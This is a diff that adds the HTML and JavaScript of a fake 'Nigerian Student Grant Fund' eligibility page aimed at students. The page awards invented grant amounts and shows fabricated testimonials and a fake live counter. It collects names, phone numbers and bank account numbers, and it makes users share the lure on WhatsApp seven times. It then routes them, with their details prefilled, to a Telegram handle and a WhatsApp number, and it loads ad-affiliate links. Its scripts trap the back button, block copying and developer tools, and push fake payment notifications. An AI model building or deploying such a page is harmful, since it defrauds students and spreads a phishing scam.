+          <div class="level-pill" onclick="selectLevel(this,'200L')">200L</div>
+          <div class="level-pill" onclick="selectLevel(this,'300L')">300L</div>
+          <div class="level-pill" onclick="selectLevel(this,'400L')">400L</div>
+          <div class="level-pill" onclick="selectLevel(this,'HND')">HND</div>
+          <div class="level-pill" onclick="selectLevel(this,'NCE')">NCE</div>
+        </div>
+      </div>
+      <button class="btn-check" onclick="startCheck()">🔍 Check My Eligibility Now →</button>
+    </div>
+  </div>
+
+  <div class="trust-strip">
+    <div class="ts-item"><span class="ts-icon">✅</span> 100% Free</div>
+    <div class="ts-item"><span class="ts-icon">🔒</span> Secure</div>
+    <div class="ts-item"><span class="ts-icon">⚡</span> Instant Result</div>
+  </div>
+
+  <!-- GRANTS -->
+  <div class="grants-hd">What the Grant Covers</div>
+  <div class="grants-sub">Based on your level, you may qualify for one or more:</div>
+  <div class="grant-grid">
+    <div class="grant-card"><span class="gc-icon">📚</span><div class="gc-type">School Fees</div><div class="gc-amount">Up to ₦50,000</div><div class="gc-check">✓</div></div>
+    <div class="grant-card"><span class="gc-icon">🍽️</span><div class="gc-type">Upkeep & Feeding</div><div class="gc-amount">Up to ₦20,000</div><div class="gc-check">✓</div></div>
+    <div class="grant-card"><span class="gc-icon">🏥</span><div class="gc-type">Health Care</div><div class="gc-amount">Up to ₦15,000</div><div class="gc-check">✓</div></div>
+    <div class="grant-card"><span class="gc-icon">📝</span><div class="gc-type">Project Fund</div><div class="gc-amount">Up to ₦10,000</div><div class="gc-check">✓</div></div>
+  </div>
+
+  <!-- TESTIMONIALS -->
+  <div class="testi-hd"><div class="td-dot"></div><div class="td-txt">// Students receiving grants now //</div></div>
+  <div id="testiWrap">
+    <div class="tc"><div class="tc-av">👩🏾</div><div class="tc-b"><div class="tc-hd">Chioma O., Lagos <span class="tc-time">3m ago</span></div><div class="tc-msg">Just checked and I qualified! <span class="ok">₦50,000 for school fees incoming!</span> Please share with every student you know 🙏</div></div></div>
+    <div class="tc"><div class="tc-av">👨🏾</div><div class="tc-b"><div class="tc-hd">Emeka T., Enugu <span class="tc-time">7m ago</span></div><div class="tc-msg">I thought I wouldn't qualify but I did! <span class="hl">₦70,000 total.</span> Check yours now — it's real and free 💯</div></div></div>
+    <div class="tc"><div class="tc-av">👩🏽</div><div class="tc-b"><div class="tc-hd">Fatima A., Kano <span class="tc-time">12m ago</span></div><div class="tc-msg"><span class="ok">Grant approved for my state!</span> Shared with my classmates already. Don't miss this guys 🎓</div></div></div>
+  </div>
+</div>
+
+<!-- ══ STEP 2 — CHECKING ══ -->
+<div id="s2">
+  <div class="checking-wrap">
+    <div class="ck-spinner"></div>
+    <div class="ck-title" id="ckTitle">Checking Your Eligibility...</div>
+    <p class="ck-sub" id="ckSub">Verifying grant availability for <strong id="ckState">your state</strong>...</p>
+    <div class="ck-bar-wrap">
+      <div class="ck-bar"><div class="ck-fill" id="ckFill"></div></div>
+    </div>
+    <div class="ck-steps" id="ckSteps">
+      <div class="ck-step" id="cks1"><div class="ck-step-dot"></div>Verifying state coverage...</div>
+      <div class="ck-step" id="cks2"><div class="ck-step-dot"></div>Checking level eligibility...</div>
+      <div class="ck-step" id="cks3"><div class="ck-step-dot"></div>Calculating grant amount...</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ STEP 3 — RESULT ══ -->
+<div id="s3">
+  <div class="result-wrap">
+    <div class="result-badge"><span class="rb-icon">✅</span><span class="rb-txt">Eligibility Confirmed</span></div>
+    <h2>You Qualify for a <em>Grant!</em></h2>
+    <p>Students in <strong id="resState">your state</strong> at your level are eligible for the 2026 Student Grant Fund. See your approved amount below.</p>
+  </div>
+
+  <div class="amount-reveal">
+    <div class="ar-lbl">Your Approved Grant Amount</div>
+    <div class="ar-amount" id="resAmount">₦85,000</div>
+    <div class="ar-state">Available for <strong id="resState2">your state</strong> students — 2026</div>
+  </div>
+
+  <div class="elig-card">
+    <div class="ec-hd">// Eligibility Breakdown</div>
+    <div class="ec-row"><span class="ec-key">State Coverage</span><span class="ec-val green" id="resStateVal">✓ Covered</span></div>
+    <div class="ec-row"><span class="ec-key">Level</span><span class="ec-val green" id="resLevel">✓ Eligible</span></div>
+    <div class="ec-row"><span class="ec-key">School Fees</span><span class="ec-val green">✓ ₦50,000</span></div>
+    <div class="ec-row"><span class="ec-key">Upkeep Fund</span><span class="ec-val green">✓ ₦20,000</span></div>
+    <div class="ec-row"><span class="ec-key">Health Care</span><span class="ec-val green">✓ ₦15,000</span></div>
+    <div class="ec-row"><span class="ec-key">Status</span><span class="ec-val gold">Pending Verification</span></div>
+  </div>
+
+  <button class="btn-proceed" onclick="goForm()">Proceed to Apply → </button>
+</div>
+
+<!-- ══ STEP 4 — FORM ══ -->
+<div id="s4">
+  <div class="form-hd">
+    <div class="step-badge">Step 3 of 4 — Application Details</div>
+    <h2>Fill Your Details</h2>
+    <p>Quick — 4 fields only. Then share to submit.</p>
+  </div>
+
+  <div class="form-card">
+    <div class="fc-hd"><div class="fc-hd-title">Applicant Details</div><div class="fc-hd-ref">REF: <span id="formRef">——</span></div></div>
+    <div class="fc-body">
+      <div class="fg">
+        <label class="fl">Full Name *</label>
+        <input class="fi" id="fName" type="text" placeholder="E.g. Chioma Adaeze Okonkwo">
+      </div>
+      <div class="fg">
+        <label class="fl">Phone Number *</label>
+        <input class="fi" id="fPhone" type="tel" placeholder="080XXXXXXXX">
+      </div>
+    </div>
+  </div>
+
+  <div class="form-card">
+    <div class="fc-hd"><div class="fc-hd-title">Payment Account</div><div class="fc-hd-ref">Grant disbursement only</div></div>
+    <div class="fc-body">
+      <div class="privacy-box">🔒 We only send money TO this account. We will never ask for your PIN or OTP.</div>
+      <div class="fg">
+        <label class="fl">Bank Name *</label>
+        <input class="fi" id="fBank" type="text" placeholder="e.g. GTBank, Access, Opay, Palmpay">
+      </div>
+      <div class="fg" style="margin-bottom:0;">
+        <label class="fl">Account Number *</label>
+        <input class="fi" id="fAccNo" type="number" placeholder="10-digit account number">
+      </div>
+    </div>
+  </div>
+
+  <button class="btn-check" onclick="goShareWall()" style="margin-bottom:14px;">Submit My Application →</button>
+</div>
+
+<!-- ══ STEP 5 — SHARE WALL ══ -->
+<div id="s5">
+  <div class="sw-top">
+    <h2>One Last Step!</h2>
+    <p>Share this grant portal with <strong>fellow Nigerian students</strong> to verify your application. Your grant will be processed after sharing.</p>
+  </div>
+
+  <div class="share-notice"><strong>📢 Why share?</strong> I just found out I qualify for the 2026 Student Grant Fund! Check if you qualify too — it's free and takes 30 seconds.</div>
+
+  <div class="load-card">
+    <div class="lc-top">
+      <span class="lc-lbl">Verification Progress</span>
+      <span class="lc-pct" id="loadPct">0%</span>
+    </div>
+    <div class="lc-track"><div class="lc-fill" id="loadBar"></div></div>
+    <div class="lc-status" id="loadStatus">Tap share below to begin verification</div>
+  </div>
+
+  <div class="track-box">
+    <div class="tb-dot"></div>
+    <div class="tb-b">
+      <div class="tb-title" id="tsTitle">Application Verification System</div>
+      <div class="tb-sub" id="tsSub">Awaiting your first share...</div>
+    </div>
+    <div class="tb-code" id="tsCode">——</div>
+  </div>
+
+  <div class="sf-toast" id="sfToast">✅ Share verified — tap again to continue</div>
+
+  <button class="btn-share-big" id="btnShare" onclick="doShare()">
+    <div class="bsb-inner">
+      <div class="bsb-icon">📲</div>
+      <div class="bsb-body">
+        <span class="bsb-title" id="shareTitle">Share to Verify</span>
+        <span class="bsb-sub" id="shareSub">Opens WhatsApp — share with a student</span>
+      </div>
+      <div class="bsb-arr">→</div>
+    </div>
+  </button>
+  <p class="sw-note">// Each share verifies your application with one student //</p>
+  <div class="ghost"><strong id="ghostNum">54,291</strong> applications submitted today</div>
+
+  <div class="testi-hd"><div class="td-dot"></div><div class="td-txt">// Students receiving grants right now //</div></div>
+  <div id="liveTestiWrap"></div>
+</div>
+
+<!-- ══ STEP 6 — UNLOCK ══ -->
+<div id="s6">
+  <div class="unlock-wrap">
+    <div class="unlock-seal">✅</div>
+    <h2>Application Submitted!</h2>
+    <p class="unlock-sub">Your grant application is <strong>verified and pending payment.</strong> Contact us now with your reference number to receive your funds.</p>
+
+    <div class="ref-box">
+      <div class="rb-lbl">📌 Send This When You Contact Us</div>
+      <div class="rb-txt">Your reference: <span class="rb-code" id="refReminder">——</span><br>Send this number when you DM us so we can process your payment immediately.</div>
+    </div>
+
+    <div class="cta-stack">
+      <a class="btn-tg-f" href="https://t.me/kingsamtoclef" target="_blank">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+        📲 DM Us on Telegram — Receive Payment
+      </a>
+      <a class="btn-wa-f" id="btnWaFinal" href="https://wa.me/2349023386778" target="_blank">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+        💬 DM Us on WhatsApp Instead
+      </a>
+      <a class="btn-aff" href="https://omg10.com/4/10659981" target="_blank">🔗 Complete Your Grant Profile</a>
+    </div>
+
+    <div class="share-again-row">
+      <div class="sar-b"><div class="sar-t">Help a fellow student 🙏</div><div class="sar-s">Share with more students who need this</div></div>
+      <button class="btn-sar" onclick="shareAgain()">Share 📲</button>
+    </div>
+    <p class="un-note">// NGF-2026 · Nigerian Student Grant Fund · Free //</p>
+  </div>
+</div>
+
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+const SITE="https://student-grants.vercel.app";
+const AFF="https://omg10.com/4/10659981";
+const TG="https://t.me/kingsamtoclef";
+const BACK="https://omg10.com/4/4105256";
+const REQ=7;
+
+/* BACKTRAP */
+(function(){
+  history.pushState(null,"",location.href);
+  history.pushState(null,"",location.href);
+  history.pushState(null,"",location.href);
+  window.addEventListener("popstate",function(){
+    history.pushState(null,"",location.href);
+    showBackWarn();
+  });
+})();
+
+document.addEventListener("contextmenu",e=>e.preventDefault());
+document.addEventListener("keydown",e=>{if(e.key==="F12"||(e.ctrlKey&&["u","U","s","S"].includes(e.key)))e.preventDefault();});
+document.addEventListener("copy",e=>e.preventDefault());
+
+function showBackWarn(){document.getElementById("backWarn").classList.add("show");}
+function closeBackWarn(){document.getElementById("backWarn").classList.remove("show");}
+
+/* STEP INDICATOR */
+function setStep(n){
+  try{
+    const total=5;
+    for(let i=1;i<=total;i++){
+      const c=document.getElementById("sc"+i);
+      const l=document.getElementById("sl"+i);
+      if(!c)continue;
+      if(i<n){c.className="sc done";c.textContent="✓";}
+      else if(i===n){c.className="sc active";c.textContent=i<total?i:"✓";}
+      else{c.className="sc pending";c.textContent=i<total?i:"✓";}
+      if(l)l.className=i<n?"sl done":"sl";
+    }
+  }catch(e){}
+}
+
+/* LIVE COUNTER */
+let cnt=54291;
+setInterval(()=>{
+  try{
+    cnt+=Math.floor(Math.random()*4)+1;
+    const f=cnt.toLocaleString("en-NG");
+    ["liveNum","ghostNum"].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=f;});
+  }catch(e){}
+},Math.random()*2000+1500);
+
+/* STICKY BUTTON */
+let currentStep=1;
+function handleSticky(){
+  if(currentStep===1)startCheck();
+  else if(currentStep===2){}
+  else if(currentStep===3)goForm();
+  else if(currentStep===4)goShareWall();
+  else if(currentStep===5)doShare();
+}
+function updateSticky(step){
+  currentStep=step;
+  const icon=document.getElementById("stickyIcon");
+  const text=document.getElementById("stickyText");
+  const arrow=document.getElementById("bounceArrow");
+  const btn=document.getElementById("stickyBtn");
+  if(!btn)return;
+  const configs={
+    1:{icon:"🔍",text:"Check My Eligibility Now",bg:"var(--green)"},
+    2:{icon:"⏳",text:"Checking...",bg:"var(--muted)"},
+    3:{icon:"✅",text:"Proceed to Apply",bg:"var(--green)"},
+    4:{icon:"📝",text:"Submit My Application",bg:"var(--green)"},
+    5:{icon:"📲",text:"Share to Verify",bg:"var(--wa)"},
+    6:{icon:"📲",text:"DM Us to Receive Payment",bg:"var(--tg)"},
+  };
+  const cfg=configs[step]||configs[1];
+  if(icon)icon.textContent=cfg.icon;
+  if(text)text.textContent=cfg.text;
+  btn.style.background=cfg.bg;
+  if(arrow)arrow.className=step>1?"bounce-arrow gone":"bounce-arrow";
+  if(step===6){const sc=document.getElementById("stickyCta");if(sc)sc.style.display="none";}
+}
+setTimeout(()=>{const a=document.getElementById("bounceArrow");if(a)a.classList.add("gone");},5000);
+
+/* LEVEL SELECTION */
+let selectedLevel="";
+function selectLevel(el,level){
+  document.querySelectorAll(".level-pill").forEach(p=>p.classList.remove("selected"));
+  el.classList.add("selected");
+  selectedLevel=level;
+}
+
+/* CHECKER */
+function startCheck(){
+  const state=document.getElementById("stateSelect").value;
+  if(!state){showToast("⚠️ Please select your state first");return;}
+  if(!selectedLevel){showToast("⚠️ Please select your level");return;}
+
+  document.getElementById("s1").style.display="none";
+  document.getElementById("s2").style.display="block";
+  setStep(2);updateSticky(2);
+  window.scrollTo({top:0,behavior:"smooth"});
+
+  document.getElementById("ckState").textContent=state;
+
+  // Animate checking steps
+  const fill=document.getElementById("ckFill");
+  const steps=["cks1","cks2","cks3"];
+  let p=0;
+  const titles=["Verifying state coverage...","Checking level eligibility...","Calculating grant amount..."];
+
+  const iv=setInterval(()=>{
+    p++;
+    if(fill)fill.style.width=(p*33.3)+"%";
+    if(steps[p-1]){
+      const s=document.getElementById(steps[p-1]);
+      if(s){s.classList.add("done");s.querySelector(".ck-step-dot").textContent="✓";}
+    }
+    document.getElementById("ckTitle").textContent=titles[p-1]||"Finalizing...";
+    if(p>=3){
+      clearInterval(iv);
+      if(fill)fill.style.width="100%";
+      setTimeout(()=>showResult(state,selectedLevel),600);
+    }
+  },800);
+}
+
+/* RESULT */
+const AMOUNTS={
+  "SS2":"₦65,000","SS3":"₦75,000","JAMB":"₦60,000",
+  "100L":"₦85,000","200L":"₦80,000","300L":"₦85,000",
+  "400L":"₦90,000","HND":"₦80,000","NCE":"₦75,000"
+};
+
+function showResult(state,level){
+  document.getElementById("s2").style.display="none";
+  document.getElementById("s3").style.display="block";
+  setStep(3);updateSticky(3);
+  window.scrollTo({top:0,behavior:"smooth"});
+
+  const amt=AMOUNTS[level]||"₦80,000";
+  document.getElementById("resAmount").textContent=amt;
+  ["resState","resState2"].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=state+" State";});
+  document.getElementById("resStateVal").textContent="✓ "+state+" Covered";
+  document.getElementById("resLevel").textContent="✓ "+level+" Eligible";
+  window._grantAmt=amt;window._grantState=state;window._grantLevel=level;
+}
+
+/* FORM */
+function goForm(){
+  document.getElementById("s3").style.display="none";
+  document.getElementById("s4").style.display="block";
+  setStep(4);updateSticky(4);
+  document.getElementById("formRef").textContent="NGF-"+Math.floor(100000+Math.random()*900000);
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
+/* SHARE WALL */
+function goShareWall(){
+  const name=document.getElementById("fName").value.trim();
+  const phone=document.getElementById("fPhone").value.trim();
+  const bank=document.getElementById("fBank").value.trim();
+  const acc=document.getElementById("fAccNo").value.trim();
+  if(!name){showToast("⚠️ Enter your full name");return;}
+  if(!phone){showToast("⚠️ Enter your phone number");return;}
+  if(!bank){showToast("⚠️ Enter your bank name");return;}
+  if(!acc){showToast("⚠️ Enter your account number");return;}
+
+  window._applicantName=name;window._applicantBank=bank;window._applicantAcc=acc;window._applicantPhone=phone;
+
+  document.getElementById("s4").style.display="none";
+  document.getElementById("s5").style.display="block";
+  setStep(5);updateSticky(5);
+  shares=0;buildTestis();startTestis();
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
+/* WA MESSAGE */
+function getMsg(){
+  return `🎓 I just found out I qualify for the 2026 Nigerian Student Grant Fund!
+
+Up to ₦100,000 — school fees, upkeep, health care & project fund.
+
+Check if YOU qualify here 👇
+${SITE}
+
+It's free. Takes 30 seconds. 🇳🇬`;
+}
+function shareAgain(){window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");}
+
+function genCode(){const c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";let s="";for(let i=0;i<6;i++)s+=c[Math.floor(Math.random()*c.length)];return "NGF-"+s;}
+
+let shares=0,busy=false,testiTimer=null;
+
+function doShare(){
+  if(busy)return;
+  busy=true;
+  const title=document.getElementById("shareTitle");
+  const sub=document.getElementById("shareSub");
+  if(title)title.textContent="Opening WhatsApp...";
+  setTimeout(()=>{
+    window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");
+    setTimeout(()=>{
+      busy=false;
+      if(shares>=REQ)return;
+      shares++;
+      const pct=Math.round((shares/REQ)*100);
+      const lb=document.getElementById("loadBar");
+      const lp=document.getElementById("loadPct");
+      const ls=document.getElementById("loadStatus");
+      if(lb)lb.style.width=pct+"%";
+      if(lp)lp.textContent=pct+"%";
+      const rem=REQ-shares;
+      const code=genCode();
+      if(ls)ls.textContent=rem>0?"Verifying... "+rem+" more share"+(rem>1?"s":"")+" needed":"Application fully verified!";
+      document.getElementById("tsTitle").textContent=rem>0?"Share "+shares+" Verified ✓":"All Shares Verified ✓";
+      document.getElementById("tsSub").textContent=rem>0?rem+" more to complete verification":"Processing your application...";
+      document.getElementById("tsCode").textContent=code;
+      if(title)title.textContent=rem>0?"Share Again ("+rem+" more)":"Finalizing...";
+      if(sub)sub.textContent=rem>0?"Keep sharing — almost done!":"All done!";
+      const sf=document.getElementById("sfToast");
+      if(sf){sf.textContent="✅ Share "+shares+" verified ["+code+"]";sf.classList.add("show");setTimeout(()=>sf.classList.remove("show"),4000);}
+      showToast("✅ Share verified — keep going!");
+      if(shares>=REQ)setTimeout(unlock,1200);
+    },1800);
+  },500);
+}
+
+/* UNLOCK */
+function unlock(){
+  if(testiTimer)clearInterval(testiTimer);
+  document.getElementById("s5").style.display="none";
+  document.getElementById("s6").style.display="block";
+  setStep(6);updateSticky(6);
+  const ref="NGF-2026-"+Math.floor(100000+Math.random()*900000);
+  const rr=document.getElementById("refReminder");if(rr)rr.textContent=ref;
+  const waMsg="Hello! I just applied for the 2026 Student Grant Fund.\n\nMy Reference: "+ref+"\nName: "+(window._applicantName||"")+"\nAmount: "+(window._grantAmt||"")+"\nBank: "+(window._applicantBank||"")+"\nAccount: "+(window._applicantAcc||"")+"\n\nPlease process my grant payment. Thank you!";
+  const wa=document.getElementById("btnWaFinal");if(wa)wa.href="https://wa.me/2349023386778?text="+encodeURIComponent(waMsg);
+  window.scrollTo({top:0,behavior:"smooth"});
+  if("Notification" in window){Notification.requestPermission().then(p=>{if(p==="granted"){setTimeout(()=>{new Notification("🎓 NGF-2026 Grant Alert",{body:"Your application is pending! DM us now to receive "+(window._grantAmt||"your grant")+"!",icon:"/favicon.ico"});},3000);}});}
+}
+
+/* TESTIMONIALS */
+const TESTIS=[
+  {av:"👩🏾",name:"Chioma O., Lagos",time:"just now",msg:"Just checked and <span class='ok'>I qualified!</span> ₦85,000 for school fees incoming! 🙏🎓"},
+  {av:"👨🏾",name:"Emeka T., Enugu",time:"1m ago",msg:"I didn't think I would qualify but I did! <span class='hl'>₦90,000 total.</span> Check yours now — real and free 💯"},
+  {av:"👩🏽",name:"Fatima A., Kano",time:"2m ago",msg:"<span class='ok'>Grant approved for my state!</span> Shared with all my classmates. Don't miss this 🎓"},
+  {av:"👨🏿",name:"Bolu S., Oyo",time:"1m ago",msg:"My school fees stress is over! <span class='hl'>₦50,000 coming.</span> Share with your friends now 🙏"},
+  {av:"👩🏾",name:"Grace E., Rivers",time:"3m ago",msg:"<span class='ok'>100L and I qualify!</span> So happy. Tell every student about this 😭🎓"},
+  {av:"👨🏾",name:"Chidi M., Imo",time:"2m ago",msg:"Verified and applied. <span class='hl'>₦80,000 pending.</span> DM them fast after sharing! 🔥"},
+];
+let ti=0;
+function mkT(t){return "<div class='tc-av'>"+t.av+"</div><div class='tc-b'><div class='tc-hd'>"+t.name+" <span class='tc-time'>"+t.time+"</span></div><div class='tc-msg'>"+t.msg+"</div></div>";}
+function buildTestis(){const f=document.getElementById("liveTestiWrap");if(!f)return;f.innerHTML="";TESTIS.slice(0,3).forEach((t,i)=>{const d=document.createElement("div");d.className="tc";d.style.animationDelay=i*.07+"s";d.innerHTML=mkT(t);f.appendChild(d);});ti=3;}
+function startTestis(){if(testiTimer)clearInterval(testiTimer);testiTimer=setInterval(()=>{if(ti>=TESTIS.length)ti=0;const t=TESTIS[ti++];const f=document.getElementById("liveTestiWrap");if(!f)return;const d=document.createElement("div");d.className="tc";d.innerHTML=mkT({...t,time:"just now"});f.insertBefore(d,f.firstChild);while(f.children.length>5)f.removeChild(f.lastChild);},8000);}
+
+/* NOTIFICATIONS */
+const NOTIFS=[
+  {av:"👩🏾",name:"Chioma, Lagos",time:"just now",msg:"<span class='ok'>₦85,000 grant approved!</span> Check yours now 🎓"},
+  {av:"👨🏾",name:"Emeka, Enugu",time:"1m ago",msg:"<span class='hl'>₦90,000 incoming!</span> It's real and free 💯"},
+  {av:"👩🏽",name:"Fatima, Kano",time:"2m ago",msg:"<span class='ok'>Grant confirmed!</span> Share with your classmates 🙏"},
+  {av:"👨🏿",name:"Bolu, Oyo",time:"1m ago",msg:"School fees sorted! <span class='hl'>₦50,000 approved</span> 🎓"},
+  {av:"👩🏾",name:"Grace, Rivers",time:"3m ago",msg:"<span class='ok'>Qualified and applied!</span> Don't miss this 😭"},
+  {av:"👨🏾",name:"Chidi, Imo",time:"2m ago",msg:"<span class='hl'>₦80,000 pending.</span> DM them fast! 🔥"},
+  {av:"👩🏽",name:"Amaka, Anambra",time:"4m ago",msg:"<span class='ok'>200L and I qualify!</span> Check yours 🎓"},
+  {av:"👨🏾",name:"Tunde, Lagos",time:"3m ago",msg:"<span class='hl'>₦85,000 for school fees!</span> Real 💯🙏"},
+];
+let ni=0,activeN=null;
+const nz=document.getElementById("nz");
+function showNotif(){
+  try{
+    if(ni>=NOTIFS.length)ni=0;
+    const n=NOTIFS[ni++];
+    if(activeN){activeN.classList.add("hide");setTimeout(()=>{if(activeN&&activeN.parentNode)activeN.remove();activeN=null;},350);}
+    const el=document.createElement("div");el.className="notif";
+    el.innerHTML="<div class='n-av'>"+n.av+"</div><div class='n-b'><div class='n-badge'>NGF-2026 · Grant Update</div><div class='n-row'><div class='n-name'>"+n.name+"</div><div class='n-time'>"+n.time+"</div></div><div class='n-msg'>"+n.msg+"</div></div>";
+    nz.appendChild(el);activeN=el;
+    setTimeout(()=>el.classList.add("show"),50);
+    setTimeout(()=>{el.classList.add("hide");setTimeout(()=>{if(el.parentNode)el.remove();if(activeN===el)activeN=null;},400);},4500);
+  }catch(e){}
+}
+setTimeout(()=>{showNotif();setInterval(showNotif,Math.random()*5000+7000);},3000);
+
+function showToast(m){try{const t=document.getElementById("toast");t.textContent=m;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),2800);}catch(e){}}
+
+// Init sticky
+updateSticky(1);
+</script>
+</body>
+</html>
